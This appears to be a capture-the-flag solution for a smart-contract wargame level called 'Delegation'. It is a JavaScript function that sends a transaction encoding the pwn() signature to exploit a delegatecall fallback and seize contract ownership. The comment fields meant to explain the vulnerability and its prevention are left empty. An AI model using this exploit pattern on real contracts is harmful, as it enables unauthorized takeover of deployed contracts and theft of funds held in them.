/**

Delegation
 
Vulnerability: 

Preventative Techniques:

*/

const attack = async () => {

    await sendTransaction({ 
        from: player, 
        to: contract.address, 
        data: web3.eth.abi.encodeFunctionSignature('pwn()') 
    });
}
